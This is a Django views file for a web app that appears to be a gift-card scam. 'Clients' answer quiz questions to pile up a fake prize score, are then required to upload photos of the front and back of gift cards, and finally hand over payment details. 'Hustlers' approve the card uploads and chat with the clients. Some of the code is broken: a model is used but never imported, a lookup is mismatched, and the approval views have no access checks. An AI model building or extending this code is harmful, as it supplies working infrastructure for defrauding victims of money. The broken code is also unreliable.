import random 
from django.shortcuts import render, redirect,get_object_or_404
from django.http import JsonResponse, HttpResponse 
from django.contrib.auth import authenticate, login, logout 
from django.contrib.auth.decorators import login_required 
from .models import Question, QuizResult, FrontCard, BackCard, Profile
from .forms import LoginForm,FrontGiftForm,BackGiftForm,PaymentInfo,UserRegistrationForm
from django.contrib import messages
from django.core.mail import send_mail
from django.contrib.auth.models import User
from django.utils import timezone
from django.db.models import Q



def home_view(request):
    return render(request, 'jenny/index.html') 


def LoginPage(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            cd = form.cleaned_data
            user = authenticate(username=cd['username'],password=cd['password'])
            if user is not None:
                if user.is_active:
                    login(request, user)
                    role = user.profile.role 
                    if role == 'client':
                        messages.success(request, f"{user.username}, you've sucessfully logged in!!!") 
                        return redirect('street:client') 
                        
                    elif role == 'hustler': 
                        messages.success(request, "You've sucessfully logged in!!!")
                        return redirect('street:hustler')
                        
                    
                    return redirect(request.GET.get('next'), 'street:home')
                # return redirect ('blog')
            else:
                return HttpResponse('Disabled account')
        else:
            return HttpResponse('Invalid login')
    else:
        form = LoginForm()
    return render(request, 'jenny/login.html', {'form': form})


def register(request):
    if request.method == 'POST':
        user_form = UserRegistrationForm(request.POST)
        if user_form.is_valid():
            new_user = user_form.save(commit=False)
            new_user.set_password(user_form.cleaned_data['password'])
            new_user.save()
            
            # Create profile with default role as 'client'
            Profile.objects.create(user=new_user, role='client')

                
            messages.success(request, "You've successfully registered!!!... Login to play and win")
            return redirect('street:login')
    else:
        user_form = UserRegistrationForm()
    return render(request, 'jenny/register.html', {'user_form': user_form})


@login_required 
def logout_view(request): 
    logout(request) 
    messages.success(request, "You've sucessfully logged off, we hope to see you soon!!!") 
    return redirect('street:home')
    
def approval(request):
    return render(request, 'jenny/approval.html')


@login_required
def quiz_expired(request):
    if request.method == 'GET':
        return render(request, 'jenny/quiz_expired.html')

@login_required
def withdraw_time_extension(request):
    return render(request, 'jenny/withdraw_extension.html')



@login_required 
def client_dashboard(request): 
    fcard = FrontCard.objects.filter(user=request.user).first()
    bcard = BackCard.objects.filter(user=request.user).first()
    if request.user.profile.role != 'client': 
        return redirect('street:hustler')
# 1800
    default_timer = 40  # 30 minutes
    timer = request.GET.get('timer')
    try:
        timer = int(timer)
    except (TypeError, ValueError):
        timer = default_timer

    
    # Get all questions
    questions = Question.objects.all()
    question_count = len(questions)

    quiz_result, created = QuizResult.objects.get_or_create(user=request.user)


    if quiz_result.total_questions >= 5:
        if fcard and bcard and (not fcard.approved or not bcard.approved):
            return redirect('street:approval') 
        elif not (fcard and bcard):
            return redirect('street:gift_card')
        

    if request.method == 'POST':
        question_id = request.POST.get('question_id')
        user_answer = request.POST.get('answer')
        correct_answer = request.POST.get('correct_answer')

        if user_answer == correct_answer:
            quiz_result.score += 100  

        
        quiz_result.total_questions += 1
        quiz_result.save()  

    # Get the current question based on the number of answered questions
    current_question = questions[quiz_result.total_questions]  # Questions are zero-indexed
    return render(request, 'jenny/user_dashboard.html', {
        'question': current_question,
        'quiz_result': quiz_result,
        'question_count': question_count,
        'fcard': fcard,
        'bcard': bcard,
        'timer_seconds': timer,
        
    })
    


@login_required 
def hustler_dashboard(request): 
    if request.user.profile.role != 'hustler': 
        return redirect('street:client') 

    
    active_clients = Profile.objects.filter(role='client', user__is_active=True)
    front_cards = FrontCard.objects.filter(approved=False)
    back_cards = BackCard.objects.filter(approved=False)
    user_chat = User.objects.filter(id__in=ChatMessage.objects.filter(receiver=request.user).values('sender'))

    
    context = {
        'active_clients': active_clients,
        'front_cards': front_cards,
        'back_cards': back_cards,
        'user_chat':user_chat,
        
    }

    return render(request, 'jenny/admin_dashboard.html', context) 

    
@login_required()
def viewActive(request, id):
    post = get_object_or_404(Profile, id=id)
    return render (request, 'jenny/usersdetails.html',{'post':post})

@login_required
def gift_card(request):
    if request.user.profile.role != 'client': 
        return redirect('street:login')
    return render(request, 'jenny/gift_card.html')


@login_required
def upload_card(request):
    if request.user.profile.role != 'client': 
        return redirect('street:login')
    form = FrontGiftForm()
    formb = BackGiftForm()

    fcard = FrontCard.objects.filter(user=request.user).first()
    bcard = BackCard.objects.filter(user=request.user).first()

    if request.method == 'POST':
        if 'upload_front' in request.POST:
            form = FrontGiftForm(request.POST, request.FILES)
            if form.is_valid():
                frontgiftform = form.save(commit=False)
                frontgiftform.user = request.user
                frontgiftform.save()
                messages.success(request, "Sucessfully uploaded...!!!")
                return redirect('street:upload_card')
                

        elif 'upload_back' in request.POST:
            formb = BackGiftForm(request.POST, request.FILES)
            if formb.is_valid():
                backgiftform = formb.save(commit=False)
                backgiftform.user = request.user
                backgiftform.save()
                messages.success(request, "You've sucessfully uploaded!!!")
                return redirect('street:upload_card')
                

    return render(request, 'jenny/upload_card.html', {
        'form': form,
        'fcard': fcard,
        'formb': formb,
        'bcard': bcard
    })




def AboutUs(request):
    return render(request, 'jenny/about.html') 

@login_required
def Withdraw(request):
    amt = QuizResult.objects.filter(user=request.user).first()
    if request.user.profile.role != 'client': 
        return redirect('street:login')
    if request.method == 'POST':
        form = PaymentInfo(request.POST)
        if form.is_valid():
            paymentform = form.save(commit=False)
            paymentform.user = request.user
            paymentform.score = amt.score
            paymentform.save()
            amt.total_questions = 0
            amt.score = 0
            amt.user = request.user
            amt.save()  

            messages.success(request, "You will be contacted via your valid email soon... congratulations!!!")
            return redirect('street:client')
            
    else:
        form = PaymentInfo()
    return render(request, 'jenny/withdraw.html', {'form':form}) 



@login_required
def approve_front(request, card_id):
    card = get_object_or_404(FrontCard, id=card_id)
    card.approved = True
    card.save()
    return redirect('street:hustler')

@login_required
def approve_back(request, card_id):
    card = get_object_or_404(BackCard, id=card_id)
    card.approved = True
    card.save()
    return redirect('street:hustler')



@login_required
def send_message(request):
    user = request.user
    representative = assign_hustler(user)
    admin_user = User.objects.get(username = representative)
    print(admin_user)

    if request.user == admin_user:
        messages = ChatMessage.objects.filter(
            Q(sender=admin_user) | Q(receiver = admin_user)
        ).order_by('timestamp')
    
    elif request.user != admin_user:
        messages = ChatMessage.objects.filter(
            (Q(sender=request.user) & Q(receiver=admin_user)) |
            (Q(sender=admin_user) & Q(receiver=admin_user))
        ).order_by('timestamp')


    else:
        messages = ChatMessage.objects.filter(
            (Q(sender=request.user) & Q(receiver=admin_user)) |
            (Q(sender=admin_user) & Q(receiver=admin_user))
        ).order_by('timestamp')

    if request.method == "POST":
        receiver_id = request.POST.get("receiver_id")
        content = request.POST.get("content")
        receiver = admin_user
        
        
        ChatMessage.objects.create(sender=request.user,receiver=receiver,content=content)
        return JsonResponse({'status': 'success'})
    
    return render(request, 'jenny/messenger.html', {
            
            'messages': messages,
            'partner': admin_user
        })



def assign_hustler(client_user):
    return User.objects.filter(profile__role='hustler').order_by('?').first()
